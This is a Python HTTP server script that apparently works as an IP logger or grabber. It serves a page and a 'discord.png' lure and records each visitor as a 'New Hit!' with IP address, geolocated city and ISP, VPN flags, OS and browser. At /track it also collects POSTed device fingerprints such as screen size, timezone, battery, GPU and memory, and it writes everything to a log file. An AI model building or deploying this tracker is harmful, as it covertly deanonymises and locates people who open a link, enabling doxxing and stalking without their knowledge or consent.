from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime
import urllib.request
import json
import os

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=country,city,regionName,isp,proxy,hosting,mobile"
        with urllib.request.urlopen(url, timeout=3) as r:
            data = json.loads(r.read())
            country = data.get('country', '?')
            city    = data.get('city', '?')
            region  = data.get('regionName', '?')
            isp     = data.get('isp', '?')
            flags = []
            if data.get('proxy'):   flags.append('VPN/Proxy')
            if data.get('hosting'): flags.append('Hosting')
            if data.get('mobile'):  flags.append('Mobile network')
            return country, city, region, isp, ', '.join(flags) or 'Clean'
    except:
        return '?', '?', '?', '?', '?'

def parse_ua(ua):
    ual = ua.lower()
    if 'android' in ual:           os = 'Android'
    elif 'iphone' in ual:          os = 'iPhone (iOS)'
    elif 'ipad' in ual:            os = 'iPad (iOS)'
    elif 'windows nt 10' in ual:   os = 'Windows 10/11'
    elif 'windows nt 6' in ual:    os = 'Windows 7/8'
    elif 'mac os' in ual:          os = 'macOS'
    elif 'linux' in ual:           os = 'Linux'
    else:                          os = 'Unknown'
    if 'edg/' in ual:              browser = 'Edge'
    elif 'opr/' in ual:            browser = 'Opera'
    elif 'chrome/' in ual:         browser = 'Chrome'
    elif 'firefox/' in ual:        browser = 'Firefox'
    elif 'safari/' in ual and 'chrome' not in ual: browser = 'Safari'
    else:                          browser = 'Unknown'
    is_mobile = any(x in ual for x in ['mobile', 'android', 'iphone', 'ipad'])
    return os, browser, 'Phone/Tablet' if is_mobile else 'Desktop/Laptop'

def log_hit(ip, ua, extra={}):
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os, browser, device = parse_ua(ua)
    country, city, region, isp, flags = get_ip_info(ip)

    msg = f"🎯 New Hit!\n"
    msg += f"Time: {time}\n"
    msg += f"IP: {ip}\n"
    msg += f"Location: {country} / {region} / {city}\n"
    msg += f"ISP: {isp}\n"
    msg += f"Network: {flags}\n"
    msg += f"OS: {os}\n"
    msg += f"Browser: {browser}\n"
    msg += f"Device: {device}\n"
    if extra.get('screen'):        msg += f"Screen: {extra.get('screen')}\n"
    if extra.get('timezone'):      msg += f"Timezone: {extra.get('timezone')}\n"
    if extra.get('language'):      msg += f"Language: {extra.get('language')}\n"
    if extra.get('cores'):         msg += f"CPU Cores: {extra.get('cores')}\n"
    if extra.get('memory'):        msg += f"RAM: {extra.get('memory')} GB\n"
    if extra.get('battery_level'): msg += f"Battery: {extra.get('battery_level')} (Charging: {extra.get('battery_charging')})\n"
    if extra.get('gpu'):           msg += f"GPU: {extra.get('gpu')}\n"
    if extra.get('connection'):    msg += f"Connection: {extra.get('connection')}\n"

    with open('/tmp/hits.log', 'a') as f:
        f.write(msg + '---\n')
    print(msg, flush=True)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
            return
        if self.path == '/' or self.path == '/index.html':
            ip = self.client_address[0]
            ua = self.headers.get('User-Agent', 'unknown')
            log_hit(ip, ua)
            with open('index.html', 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        elif self.path == '/discord.png':
            with open('discord.png', 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header('Content-Type', 'image/png')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/track':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body)
                ip = self.client_address[0]
                ua = self.headers.get('User-Agent', 'unknown')
                log_hit(ip, ua, extra=data)
            except Exception as e:
                print(f"[!] POST error: {e}", flush=True)
            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        pass

print("[*] Server starting on port 8080", flush=True)
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
